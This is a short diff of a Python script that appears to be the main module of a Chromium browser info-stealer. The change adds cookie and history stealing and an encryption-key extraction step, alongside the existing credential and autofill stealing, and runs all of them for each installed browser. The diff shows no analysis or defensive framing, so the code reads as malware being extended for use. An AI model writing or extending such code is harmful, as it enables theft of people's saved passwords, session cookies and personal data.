@@ -2,7 +2,9 @@
 import os
 from credentials import credential_stealer
 from autofill import autofill_stealer
-from util import TEMP_PATH, LOGS_PATH
+from cookies import cookie_stealer
+from history import history_stealer
+from util import TEMP_PATH, LOGS_PATH, get_encryption_key
 
 browsers = [
     {
@@ -23,8 +25,13 @@ if not os.path.exists(TEMP_PATH):
 if not os.path.exists(LOGS_PATH):
     os.mkdir(LOGS_PATH)
 
+# Extract from installed Chromium browsers
 for browser in browsers:
-    # Extract from installed Chromium browsers
     if os.path.exists(browser['path']):
-        credential_stealer(browser)
-        autofill_stealer(browser)
+        # Extract encryption key
+        encryption_key = get_encryption_key(browser['path'])
+        # Extract information
+        credential_stealer(browser, encryption_key)
+        autofill_stealer(browser, encryption_key)
+        cookie_stealer(browser, encryption_key)
+        history_stealer(browser, encryption_key)
